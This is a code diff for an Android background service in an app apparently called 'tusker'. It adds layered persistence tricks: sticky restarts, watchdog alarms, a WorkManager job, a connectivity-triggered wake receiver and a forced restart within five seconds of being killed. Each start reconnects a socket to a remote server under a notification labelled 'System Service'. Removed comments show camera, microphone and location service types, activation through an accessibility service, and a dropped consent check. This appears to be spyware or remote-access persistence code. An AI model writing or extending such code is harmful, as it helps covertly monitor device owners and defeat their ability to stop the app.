@@ -5,8 +5,13 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.ServiceInfo;
+import android.net.ConnectivityManager;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
@@ -14,14 +19,22 @@ import androidx.core.app.NotificationCompat;
 import com.task.tusker.MainActivity;
 import com.task.tusker.R;
 import com.task.tusker.network.SocketManager;
+import com.task.tusker.receivers.NetworkWakeReceiver;
 
 public class DataSyncService extends Service {
 
-    private static final String TAG = "DataSyncService";
-    private static final String CHANNEL_ID = "DataSyncChannel";
-    private static final int NOTIFICATION_ID = 1;
+    private static final String TAG             = "DataSyncService";
+    private static final String CHANNEL_ID      = "DataSyncChannel";
+    private static final int    NOTIFICATION_ID = 1;
 
     private SocketManager socketManager;
+
+    /**
+     * Method 3 (dynamic leg): CONNECTIVITY_CHANGE cannot be manifest-declared
+     * on API 24+, so we register/unregister it here in the service lifecycle.
+     */
+    private final BroadcastReceiver connectivityReceiver = new NetworkWakeReceiver();
+    private boolean connectivityReceiverRegistered = false;
 
     @Override
     public void onCreate() {
@@ -34,23 +47,8 @@ public class DataSyncService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "onStartCommand — starting foreground + connecting socket");
 
-        // Always run as foreground service so Android doesn't kill us.
-        //
-        // Android 14+ (API 34) and especially Android 15 (API 35) strictly
-        // enforce that every foregroundServiceType declared in the manifest
-        // for this service has its corresponding runtime permission already
-        // granted at the moment startForeground() is called.  The manifest
-        // declares dataSync|camera|microphone|location for compatibility,
-        // but on first launch the camera / mic / location permissions are
-        // not yet granted, which on Android 15 throws SecurityException
-        // (ForegroundServiceTypeSecurityException) and crashes the app
-        // before MainActivity is visible.
-        //
-        // Start with only the dataSync type — it requires no runtime
-        // permission and is always safe.  When camera / microphone /
-        // location features are actually used later, the relevant
-        // command handlers can re-call startForeground() with the
-        // appropriate type after confirming the permission is granted.
+        // Start as foreground with minimum required type to avoid
+        // ForegroundServiceTypeSecurityException on Android 15.
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(
@@ -63,34 +61,90 @@ public class DataSyncService extends Service {
             }
         } catch (Exception e) {
             Log.e(TAG, "startForeground failed: " + e.getMessage());
-            // Fall back to plain startForeground so the service at least
-            // attempts to stay alive instead of taking the app down with it.
-            try {
-                startForeground(NOTIFICATION_ID, createNotification());
-            } catch (Exception ignored) {}
+            try { startForeground(NOTIFICATION_ID, createNotification()); }
+            catch (Exception ignored) {}
         }
 
-        // Always connect — the accessibility service enables this service
-        // only after the user manually turns on accessibility, so consent
-        // is implicitly given.  The old consent check prevented reconnection
-        // when the service was restarted by the accessibility watchdog.
         connectToServer();
+        registerDynamicConnectivityReceiver(); // Method 3
 
-        // START_STICKY: if Android kills this service, restart it automatically
+        // Method 4 + 5: arm alarm and WorkManager on every start.
+        ServiceWatchdog.scheduleWakeAlarm(this);
+        WakeWorker.schedule(this);
+
+        // Method 1: START_STICKY causes Android to auto-restart this
+        // service after system kills it.
         return START_STICKY;
     }
+
+    // ─── Method 3: dynamic CONNECTIVITY_CHANGE receiver ──────────────────────
+
+    private void registerDynamicConnectivityReceiver() {
+        if (connectivityReceiverRegistered) return;
+        try {
+            IntentFilter filter = new IntentFilter();
+            filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
+            filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
+            filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU /* 33 */) {
+                registerReceiver(connectivityReceiver, filter, RECEIVER_NOT_EXPORTED);
+            } else {
+                registerReceiver(connectivityReceiver, filter);
+            }
+            connectivityReceiverRegistered = true;
+            Log.d(TAG, "Dynamic connectivity receiver registered");
+        } catch (Exception e) {
+            Log.e(TAG, "registerDynamicConnectivityReceiver: " + e.getMessage());
+        }
+    }
+
+    private void unregisterDynamicConnectivityReceiver() {
+        if (!connectivityReceiverRegistered) return;
+        try {
+            unregisterReceiver(connectivityReceiver);
+            connectivityReceiverRegistered = false;
+        } catch (Exception e) {
+            Log.w(TAG, "unregisterDynamicConnectivityReceiver: " + e.getMessage());
+        }
+    }
+
+    // ─── Socket connection ────────────────────────────────────────────────────
 
     private void connectToServer() {
         try {
             socketManager = SocketManager.getInstance(this);
-            // forceReconnect() tears down any stale sockets from a previous process
-            // and starts fresh connection loops — handles crash-restart correctly.
             socketManager.forceReconnect();
             Log.d(TAG, "SocketManager.forceReconnect() called");
         } catch (Exception e) {
             Log.e(TAG, "connectToServer error: " + e.getMessage());
         }
     }
+
+    // ─── Lifecycle ────────────────────────────────────────────────────────────
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG, "Service destroyed — scheduling restart in 5 s");
+
+        unregisterDynamicConnectivityReceiver();
+
+        if (socketManager != null) {
+            socketManager.disconnect();
+        }
+
+        // Method 1 (extra guard): schedule a short-fuse alarm so the service
+        // comes back within 5 seconds even if START_STICKY is delayed by the OS.
+        ServiceWatchdog.scheduleWakeAlarm(this, ServiceWatchdog.RESTART_DELAY_MS);
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    // ─── Notification ─────────────────────────────────────────────────────────
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -101,7 +155,6 @@ public class DataSyncService extends Service {
             );
             channel.setDescription("Keeps data sync connection active");
             channel.setShowBadge(false);
-
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
         }
@@ -111,7 +164,8 @@ public class DataSyncService extends Service {
         Intent notificationIntent = new Intent(this, MainActivity.class);
         int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                     ? PendingIntent.FLAG_IMMUTABLE : 0;
-        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, flags);
+        PendingIntent pendingIntent =
+            PendingIntent.getActivity(this, 0, notificationIntent, flags);
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service")
@@ -121,19 +175,5 @@ public class DataSyncService extends Service {
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build();
-    }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        Log.d(TAG, "Service destroyed — socket will be disconnected");
-        if (socketManager != null) {
-            socketManager.disconnect();
-        }
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
     }
 }
